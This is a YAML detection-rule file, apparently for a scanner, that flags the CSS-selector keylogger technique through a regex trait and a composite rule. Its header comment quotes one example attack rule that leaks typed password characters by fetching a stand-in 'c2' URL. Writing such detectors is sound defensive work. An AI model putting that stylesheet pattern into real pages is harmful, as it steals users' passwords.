# The stylesheet half of the CSS-selector keylogger. javascript.yaml covers the
# collection server and the demo page; this covers the delivered `.css` itself,
# which a stored XSS or a trojanized theme asset can carry on its own. The
# attack emits one rule per candidate character —
#   input[type=password][value$="a"] { background: url(https://c2/a) }
# — so whichever rule matches fetches an attacker URL that names the character
# typed. Styling a field by value happens on meaningful prefixes ("http",
# ".png"); keying rules on a *single* character, repeatedly, is the sweep.
defaults:
  platforms: [unix, windows]
  for: [text]
  attack: T1056.001

traits:
  - id: single-char-value-selector-sweep
    desc: Stylesheet enumerates one-character input values
    crit: suspicious
    conf: 0.95
    # A real sweep covers an alphabet; 8 keeps digits-only variants in range
    # while staying far above any hand-written stylesheet.
    count_min: 8
    if:
      type: text
      regex: '\[\s*value\s*[\^$*]=\s*["''].["'']'

composite_rules:
  - id: css-value-selector-url-exfil
    desc: CSS keylogger leaks input via URL fetches
    crit: hostile
    conf: 0.96
    all:
      - id: single-char-value-selector-sweep
      - id: micro-behaviors/communications/http/client/resource::stylesheet-remote-url-value
